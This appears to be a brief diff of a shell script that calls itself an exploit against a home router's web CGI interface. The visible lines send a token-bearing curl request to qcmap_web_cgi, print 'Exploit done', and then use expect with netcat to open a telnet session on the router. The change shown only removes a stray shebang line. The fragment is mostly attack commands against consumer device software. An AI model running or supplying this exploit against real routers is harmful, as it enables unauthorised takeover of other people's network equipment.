@@ -16,8 +16,6 @@ curl -s 'http://192.168.0.1/cgi-bin/qcmap_web_cgi' -b "tpweb_token=$token" -d '{
 
 echo Exploit done
 
-#!/bin/bash
-
 # Use expect to run the telnet session with netcat to the IP 192.168.0.1 and port 23
 expect <<EOF
 spawn nc 192.168.0.1 23
